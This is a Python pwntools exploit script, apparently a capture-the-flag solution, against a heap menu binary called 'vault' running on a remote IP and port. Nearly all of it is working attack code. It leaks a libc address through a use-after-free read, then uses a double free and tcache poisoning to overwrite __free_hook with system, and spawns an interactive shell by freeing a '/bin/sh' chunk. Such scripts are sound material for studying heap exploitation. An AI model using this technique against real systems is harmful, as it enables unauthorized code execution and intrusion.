#!/usr/bin/env python3

from pwn import *

elf = ELF("./vault")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"

domain = "65.109.94.22"
port = 30270

def start():
    if args.REMOTE:
        return remote(domain, port)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript='''
        ''')
    else:
        return process([elf.path])

r = start()

def create(slot, size, data):
    r.sendlineafter(b'Opcion > ', b'1')
    r.sendlineafter(b'Slot [0-7]: ', str(slot).encode())
    r.sendlineafter(b'[1-0x500]: ', str(size).encode())
    r.sendafter(b'Datos: ', data)

def read_slot(slot):
    r.sendlineafter(b'Opcion > ', b'2')
    r.sendlineafter(b'Slot [0-7]: ', str(slot).encode())
    r.recvuntil(b"Datos: ")
    return r.recvline()

def edit(slot, data):
    r.sendlineafter(b'Opcion > ', b'3')
    r.sendlineafter(b'Slot [0-7]: ', str(slot).encode())
    r.sendafter(b'Nuevos datos: ', data)

def delete(slot):
    r.sendlineafter(b'Opcion > ', b'4')
    r.sendlineafter(b'Slot [0-7]: ', str(slot).encode())

# === Exploit ===

create(0, 0x20, b'A')
create(1, 0x4c0, b'B')
create(2, 0x20, b'A')
delete(1)  # unsorted bin

libc_leak = u64(read_slot(1)[:8])

libc_base = libc_leak -  0x1ebbe0
print(f"Libc base: {hex(libc_base)}")

libc.address = libc_base
free_hook = libc.sym['__free_hook']
system_addr = libc.sym['system']
print(f"__free_hook: {hex(free_hook)}")
print(f"system: {hex(system_addr)}")

# tcache poisoning
create(3, 0x80, b'C'*0x80)
delete(3)  
edit(3,b"A"*16)
delete(3)  # double free

edit(3, p64(free_hook - 0x10)) 

create(4, 0x80, b'D'*0x80)  
create(5, 0x80, b'E'*0x80)  

edit(5, p64(system_addr)*4)

# boom
create(6, 0x80, b'/bin/sh\x00')
delete(6)

# shell
r.interactive()
